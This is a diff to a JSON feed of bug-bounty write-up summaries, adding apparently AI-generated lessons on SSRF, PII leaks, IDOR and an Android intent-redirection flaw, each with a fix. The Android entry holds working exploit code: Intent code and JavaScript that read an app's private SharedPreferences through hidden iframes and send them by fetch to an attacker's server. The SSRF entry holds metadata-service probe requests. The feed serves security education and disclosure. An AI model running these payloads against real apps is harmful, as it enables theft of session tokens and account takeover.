@@ -1,5 +1,47 @@
 [
   {
+    "id": "74ee4ae1ce2a",
+    "title": "1 AI Subscription made me 100k$ in 2 months",
+    "url": "https://anontriager.medium.com/1-ai-subscription-made-me-100k-in-2-months-f900750d6661",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Anonymous Traiger"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-04T20:13:46.000Z",
+    "added_at": "2026-11-04T22:54:48.295Z",
+    "categories": [
+      "ssrf",
+      "info-disclosure",
+      "access-control"
+    ],
+    "severity": "high",
+    "difficulty": "beginner",
+    "summary_en": "A researcher earned $100,000 by identifying SSRF, PII leaks, API misconfigurations, and hardcoded credentials across various bug bounty programs. These vulnerabilities allowed unauthorized server-side requests and exposure of sensitive user data.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause of these issues is a failure to define and enforce strict trust boundaries. For SSRF, the server trusts user-provided URLs (web addresses) to fetch resources without validating if the destination is internal or external. PII (Personally Identifiable Information) disclosure happens when APIs (rules for software communication) return excessive data, relying on the UI (User Interface) to hide it rather than the server to filter it. API misconfigurations occur when endpoints (specific API addresses) lack authorization checks, assuming any successful request is valid. Lastly, hardcoded credentials in JavaScript (code running in the browser) expose secrets because developers forget that client-side code is entirely public.",
+      "walkthrough": "PHASE: SSRF DISCOVERY\n1. Find a feature that fetches resources, like a preview generator.\n2. Input a URL (a web address) you control to see if the server contacts you.\nhttp://your-attacker-server.com\nWhy: This confirms the server makes outbound HTTP requests (messages sent from a client to a server).\n3. Attempt to reach internal services.\nhttp://localhost:8080\nWhy: This tests if the server can talk to its own internal ports (entry points for software).\nPHASE: PII DISCLOSURE\n4. Open the browser's Network tab to see API (rules for software communication) responses.\n5. Trigger a request for a user profile.\nGET /api/v1/user/profile\nWhy: This fetches user data to display on the page.\n6. Inspect the raw JSON (a text-based format for data) returned.\n7. Look for PII (Personally Identifiable Information) not visible in the UI (User Interface).\nWhy: Developers often send the whole user object instead of just the name and photo.\nPHASE: API MISCONFIGURATION\n8. Identify an endpoint (a specific API address) that performs an action.\nPOST /api/v1/settings/update\nWhy: This endpoint changes user preferences.\n9. Change the user ID in the payload (the actual data sent) to another user's ID.\n{\"user_id\": \"999\", \"email\": \"hacker@example.com\"}\nWhy: This tests if the server checks if User A is allowed to change User B's settings.\n10. Check if the server returns a 200 OK success message.\nWhy: A success message without permission checks indicates a broken access control.\nPHASE: CREDENTIALS IN JS\n11. Load the target website in a browser.\n12. Open the Sources tab in Developer Tools.\n13. Search for strings like key, secret, or token.\nconst API_KEY = \"sk_live_51...\"\nWhy: JavaScript (code that runs in your browser) is entirely public and readable by anyone.\n14. Verify if the key is a sensitive secret or just a public identifier.\nWhy: Public keys are safe; private secrets grant unauthorized access to services.",
+      "example": "Imagine a site target.example that lets you 'Import a Profile Picture from URL'. The server takes your URL and downloads the image. A vulnerable code snippet might look like: app.post('/import', (req, res) => { downloadImage(req.body.imageUrl); }). An attacker sends a request like: POST /import HTTP/1.1 \\n Host: target.example \\n Content-Type: application/json \\n\\n {\"imageUrl\": \"http://169.254.169.254/latest/meta-data/\"}. This works because the server (the computer running the site) blindly follows the URL (web address) provided by the user. Instead of an image, it fetches sensitive internal configuration data from its own cloud provider's metadata service.",
+      "takeaway": "Look for features that process URLs or return user profiles. Always check the Network tab in your browser to see the full data sent by the server, as it often contains more than the UI shows. Use automated scanners to find secrets in JS files, but manually verify their impact. A common mistake is assuming a hidden field in the UI is secure; if it's in the HTTP response (the data sent from server to browser), it's public. Variants include SSRF via PDF generators or PII leaks in search suggestions.",
+      "fix": "To fix SSRF, implement a strict allow-list of domains and block access to internal IP addresses. For PII disclosure, use Data Transfer Objects (DTOs) to ensure only the minimum required data is sent to the browser. API endpoints must implement robust authorization checks to verify that the requester has permission for the specific action or data. Finally, never store sensitive credentials in JavaScript; instead, use server-side environment variables and proxy requests through the backend. For example, a fix for SSRF would involve checking: if (!allowedDomains.includes(new URL(inputUrl).hostname)) return error;",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "What interests me more is the gap behind each finding: the difference between what an application was supposed to protect and what it actually exposed. My findings covered four categories. Each raises a different question about trust. Who is making that request? Who should receive that information? What protects that endpoint? And why is that credential in the browser? I’m keeping this account at the category level to avoid identifying private programs. ## 1. SSRF: When the Server Becomes the Way In Press enter or click to view image in full size Image 4 _Concept illustration: a request crosse",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "09d712ce68e0",
     "title": "Intent Redirection to One-Click Account Takeover (But It’s a Duplicate)",
     "url": "https://abdelnasserr.medium.com/intent-redirection-to-one-click-account-takeover-but-its-a-duplicate-275f5a0aefaf",
@@ -40,6 +82,47 @@
     "ai_generated": true,
     "engagement": null,
     "score": 60
+  },
+  {
+    "id": "3cc9d10bb580",
+    "title": "Stealing App Internal Files via Intent Redirection to Insecure WebView",
+    "url": "https://abdelnasserr.medium.com/stealing-app-internal-files-via-intent-redirection-to-insecure-webview-9defd06aa0c6",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "abdelnasser"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-03T15:20:26.000Z",
+    "added_at": "2026-11-04T22:55:35.820Z",
+    "categories": [
+      "access-control",
+      "info-disclosure"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "An exported activity lets an attacker specify any internal class name, which is loaded via reflection and launched, and a WebView with universal file access reads the app’s private SharedPreferences and sends them to the attacker’s server.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The app’s BootActivity is declared exported in the AndroidManifest, meaning any other app can start it. It reads the string extra \"extraDeepLinkClass\" and passes it directly to Class.forName() without checking whether the class is allowed. This unchecked reflection lets a malicious app launch any internal activity. The targeted AmexWebViewActivity configures its WebView with setAllowUniversalAccessFromFileURLs(true), which removes the same‑origin restriction and permits a file:// page to be loaded from a content:// URI. Together, these design flaws enable a zero‑permission app to load attacker‑controlled HTML that can read internal files and exfiltrate them.",
+      "walkthrough": "RECON\nStep 1: Open the app’s AndroidManifest.xml and look for activities with android:exported=\"true\". Definition: an AndroidManifest is a file that describes app components; an exported activity can be started by other apps.\nStep 2: Decompile the APK (e.g., with jadx) and inspect the exported BootActivity code. Definition: decompile means converting compiled bytecode back to readable source. The code shows:\npublic static final Class<?> resolveClass(String className) { try { return Class.forName(className); } catch (ClassNotFoundException unused) { return null; } }\nWhy: Class.forName() loads a class by name at runtime (reflection) without validation.\n\nEXPLOITATION\nStep 3: Identify an internal activity that hosts a WebView with dangerous settings. Definition: a WebView is a component that renders web pages inside an app. The AmexWebViewActivity calls:\nsettings.setAllowUniversalAccessFromFileURLs(true);\nWhy: This setting disables the same‑origin policy, allowing file:// URLs to be accessed from other schemes.\nStep 4: Write a small Android app (zero permissions) that creates an Intent. Definition: an Intent is a message object used to request an action from another app.\nIntent intent = new Intent();\nWhy: This creates an empty Intent object.\nStep 5: Point the Intent to the target package and the exported BootActivity.\nintent.setClassName(\"com.redacted.app\", \"com.redacted.app.core.activity.BootActivity\");\nWhy: setClassName tells Android which app (package) and which component (class) should receive the Intent.\nStep 6: Add the extra that tells BootActivity which internal class to launch.\nintent.putExtra(\"extraDeepLinkClass\", \"com.redacted.app.webview.AmexWebViewActivity\");\nWhy: putExtra attaches a key‑value pair to the Intent; the key matches what BootActivity reads.\nStep 7: Add the extra that supplies the attacker‑controlled content URI.\nintent.putExtra(\"extra-web-view-activity-url\", \"content://com.attacker.poc.provider/exploit\");\nWhy: This URI will be loaded by the WebView; content:// identifies data served by a ContentProvider (a component that shares data between apps).\nStep 8: Launch the activity.\nstartActivity(intent);\nWhy: startActivity tells Android to start the component described by the Intent.\nStep 9: BootActivity receives the Intent, calls resolveClass() → Class.forName(\"com.redacted.app.webview.AmexWebViewActivity\"), and starts that activity, forwarding all extras.\nWhy: The reflection call loads the attacker‑chosen class and the system launches it.\nStep 10: AmexWebViewActivity receives the extra‑web‑view‑activity‑url and loads it into its WebView.\nWhy: The WebView now navigates to the attacker’s content:// URL.\nStep 11: The attacker’s ContentProvider returns an HTML page containing JavaScript that creates hidden iframes pointing to internal files:\nvar P = \"/data/data/com.redacted.app/shared_prefs/\";\n[\"app_preferences.xml\", \"AppPrefs.xml\"].forEach(function(file) {\n  var ifr = document.createElement(\"iframe\");\n  ifr.style.display = \"none\";\n  ifr.src = \"file://\" + P + file;\n  ifr.onload = function() {\n    var d = ifr.contentDocument.documentElement.outerHTML;\n    fetch(SERVER + \"/collect\", {method: \"POST\", body: JSON.stringify({path: file, data: d})});\n  };\n  document.body.appendChild(ifr);\n});\nWhy: <iframe> embeds another page; src=\"file://…\" tells the browser to load a file from the device’s filesystem. Because universal file access is enabled, the WebView can read these files.\nStep 12: The fetch() call sends the file contents to the attacker’s server.\nWhy: fetch performs an HTTP POST request; the body contains the file path and its XML data.\n\nIMPACT\nStep 13: The attacker receives the SharedPreferences XML files, which contain session tokens and user data, enabling account takeover.\nWhy: SharedPreferences often store sensitive information; reading them compromises the user’s account.",
+      "example": "**Fictional target:** target.example\n**Vulnerable snippet (exported activity):**\npublic class EntryActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        String cls = getIntent().getStringExtra(\"className\");\n        try {\n            Class<?> c = Class.forName(cls); // <-- no validation\n            Intent i = new Intent(this, c);\n            i.putExtras(getIntent());\n            startActivity(i);\n        } catch (Exception e) { }\n    }\n}\n**Vulnerable WebView activity:**\npublic class InsecureWebViewActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        WebView w = new WebView(this);\n        WebSettings s = w.getSettings();\n        s.setAllowUniversalAccessFromFileURLs(true); // <-- dangerous\n        String url = getIntent().getStringExtra(\"url\");\n        w.loadUrl(url);\n        setContentView(w);\n    }\n}\n**Exploit code (run in a separate app):**\nIntent i = new Intent();\n i.setClassName(\"target.example\", \"target.example.EntryActivity\");\n i.putExtra(\"className\", \"target.example.InsecureWebViewActivity\");\n i.putExtra(\"url\", \"content://attacker.provider/page\");\n startActivity(i);\n**Why it works:** The EntryActivity loads any class name via Class.forName, so the attacker can launch InsecureWebViewActivity. That activity loads a content:// page supplied by the attacker. Because universal file access is enabled, the page can embed hidden iframes that read file:///data/data/target.example/shared_prefs/*.xml and POST them to the attacker’s server.",
+      "takeaway": "When reviewing Android apps, always check for exported components that accept class names or other reflective inputs; these are classic intent‑redirection (or IDOR‑BOLA) issues. Look for android:exported=\"true\" combined with getStringExtra() followed by Class.forName or similar reflection. Also scan WebView configurations for setAllowUniversalAccessFromFileURLs(true) or setAllowFileAccessFromFileURLs(true), which relax the same‑origin policy. Tools such as apktool, jadx, and grep for \"exported\" or \"setAllowUniversalAccessFromFileURLs\" help automate discovery. Variants include using a custom scheme (e.g., intent://) to trigger activity launches, or enabling JavaScript bridges that expose file APIs. Beginners often forget that a WebView can read private files without any Android permission when universal access is turned on, leading to data leakage.",
+      "fix": "Remove the exported flag from BootActivity or restrict it with android:exported=\"false\" if external launches are not required. If it must stay exported, validate the incoming class name against an allow‑list of known safe activities before calling Class.forName, e.g.,\nif (ALLOWED.contains(className)) { Class.forName(className); } else { reject(); }\nIn the WebView activity, disable the dangerous setting:\nsettings.setAllowUniversalAccessFromFileURLs(false);\nOptionally also call settings.setAllowFileAccessFromFileURLs(false) and settings.setAllowFileAccess(false) to enforce the default same‑origin policy. These changes prevent arbitrary internal activity launches and block file:// reads from WebView content, eliminating the data‑exfiltration path.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "**بِسْمِ اَللَّهِ وَالْحَمْدِ لِلَّهِ الَّذِي عَلَّمَ بِالْقَلَمِ عَلَّمَ الْإِنْسَانَ مَا لَمْ يَعْلَمْ وَالصَّلَاةَ وَالسَّلَامَ عَلَى خَيْرِ مُعَلِّمِي اَلنَّاسِ اَلْخَيْرِ مُحَمَّدْ وَبَعْدٍ** ## Description I was reversing the Android app of a global hospitality company when I noticed the main launcher activity is exported and accepts an `extraDeepLinkClass` string extra. The app passes it straight to `Class.forName()` to resolve and launch any internal activity with attacker-controlled extras. By targeting an internal WebView activity that has `setAllowUniversalAccessFromFileURLs(true)`,",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
   },
   {
     "id": "eb6a9aad4e7a",
